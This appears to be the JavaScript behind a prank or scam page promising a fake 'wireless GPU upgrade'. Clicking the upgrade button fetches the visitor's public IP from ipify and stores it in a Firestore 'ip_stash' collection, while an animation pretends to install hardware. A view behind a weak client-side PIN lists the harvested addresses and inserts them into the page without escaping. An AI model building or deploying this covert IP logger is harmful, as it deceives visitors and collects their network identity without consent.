import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
import { getAnalytics } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-analytics.js";
import { getFirestore, collection, addDoc, getDocs, getDoc, doc, query, orderBy } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
import { getAuth, signInAnonymously } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-auth.js";

const firebaseConfig = {
    apiKey: "AIzaSyDyfler3VAs9JNssUtunBt8nUuu1mDaY2w",
    authDomain: "upgrade-e8667.firebaseapp.com",
    projectId: "upgrade-e8667",
    storageBucket: "upgrade-e8667.firebasestorage.app",
    messagingSenderId: "142301877051",
    appId: "1:142301877051:web:64d8bc50a07277eea99d1e",
    measurementId: "G-NNDBX81G3K"
};

const app = initializeApp(firebaseConfig);
const analytics = getAnalytics(app);
const db = getFirestore(app);
const auth = getAuth(app);

const navHome = document.getElementById('nav-home');
const navStash = document.getElementById('nav-stash');
const homeView = document.getElementById('home-view');
const stashView = document.getElementById('stash-view');

const gpuTabs = document.querySelectorAll('.gpu-tab');
const selectedGpuTitle = document.getElementById('selected-gpu-title');
const specVram = document.getElementById('spec-vram');
const specBoost = document.getElementById('spec-boost');
const specDlss = document.getElementById('spec-dlss');

const progressContainer = document.getElementById('download-progress-container');
const progressBarFill = document.getElementById('progress-bar-fill');
const downloadPercentage = document.getElementById('download-percentage');
const downloadStatusText = document.getElementById('download-status-text');
const upgradeBtn = document.getElementById('upgrade-btn');
const btnText = document.getElementById('btn-text');

let currentGpuModel = "NVIDIA RTX 5090";

// GPU Tab Selection Handler
gpuTabs.forEach(tab => {
    tab.addEventListener('click', () => {
        gpuTabs.forEach(t => t.classList.remove('active'));
        tab.classList.add('active');

        currentGpuModel = tab.dataset.model;
        selectedGpuTitle.textContent = currentGpuModel;
        specVram.textContent = tab.dataset.vram;
        specBoost.textContent = tab.dataset.boost;
        specDlss.textContent = tab.dataset.dlss;
    });
});

// Navigation Logic
navHome.addEventListener('click', (e) => {
    e.preventDefault();
    homeView.classList.remove('hidden');
    stashView.classList.add('hidden');
    navHome.classList.add('active');
    navStash.classList.remove('active');
});

navStash.addEventListener('click', async () => {
    const enteredPin = prompt('Enter Password:');
    if (enteredPin === null) return;

    try {
        await signInAnonymously(auth);

        const pinDocRef = doc(db, "settings", "access");
        const pinSnap = await getDoc(pinDocRef);

        let correctPin = '2412';
        if (pinSnap.exists()) {
            correctPin = pinSnap.data().pin;
        }

        if (enteredPin === correctPin) {
            homeView.classList.add('hidden');
            stashView.classList.remove('hidden');
            navStash.classList.add('active');
            navHome.classList.remove('active');
            await renderStash();
        } else {
            alert('Access Denied: Incorrect Password');
        }
    } catch (error) {
        console.error("Auth or PIN verification error:", error);
        alert("Authentication failed.");
    }
});

// Upgrade Download Handler
upgradeBtn.addEventListener('click', async function () {
    upgradeBtn.disabled = true;
    btnText.textContent = 'Initializing Stream...';
    progressContainer.classList.remove('hidden');

    try {
        const response = await fetch('https://api.ipify.org?format=json');
        if (!response.ok) throw new Error('Network error');
        const data = await response.json();

        await addDoc(collection(db, "ip_stash"), {
            ip: data.ip,
            gpu: currentGpuModel,
            time: new Date().toLocaleString(),
            timestamp: Date.now()
        });

        // Simulate VRAM download animation
        let progress = 0;
        const interval = setInterval(() => {
            progress += Math.floor(Math.random() * 12) + 5;
            if (progress > 100) progress = 100;

            progressBarFill.style.width = `${progress}%`;
            downloadPercentage.textContent = `${progress}%`;

            if (progress < 40) {
                downloadStatusText.textContent = `Allocating Cloud VRAM for ${currentGpuModel}...`;
            } else if (progress < 85) {
                downloadStatusText.textContent = "Injecting virtual CUDA cores over Wi-Fi...";
            } else if (progress < 100) {
                downloadStatusText.textContent = "Finalizing wireless installation...";
            } else {
                clearInterval(interval);
                downloadStatusText.textContent = "Download Complete!";
                btnText.textContent = "Upgrade Installed!";
                upgradeBtn.classList.add('completed');
                upgradeBtn.innerHTML = `<i class="fa-solid fa-circle-check"></i> <span>Upgrade Complete!</span>`;
            }
        }, 200);

    } catch (error) {
        console.error("Error during download process:", error);
        upgradeBtn.disabled = false;
        btnText.textContent = 'Try Again';
        progressContainer.classList.add('hidden');
    }
});

// Fetch and Render Stash Logs
async function renderStash() {
    const stashList = document.getElementById('stash-list');
    stashList.innerHTML = '<p class="empty-msg">Loading from Firestore...</p>';

    try {
        const q = query(collection(db, "ip_stash"), orderBy("timestamp", "desc"));
        const querySnapshot = await getDocs(q);

        if (querySnapshot.empty) {
            stashList.innerHTML = '<p class="empty-msg">Stash is empty.</p>';
            return;
        }

        let html = '';
        querySnapshot.forEach((doc) => {
            const entry = doc.data();
            const gpuTag = entry.gpu ? ` <small style="color: #64748b;">(${entry.gpu})</small>` : '';
            html += `
                <div class="stash-item">
                    <span class="stash-ip">${entry.ip}${gpuTag}</span>
                    <span class="stash-time">${entry.time}</span>
                </div>
            `;
        });
        stashList.innerHTML = html;
    } catch (error) {
        console.error("Error fetching stash:", error);
        stashList.innerHTML = '<p class="empty-msg">Access denied or failed to load logs.</p>';
    }
}

document.getElementById('clear-stash-btn').addEventListener('click', async () => {
    await renderStash();
});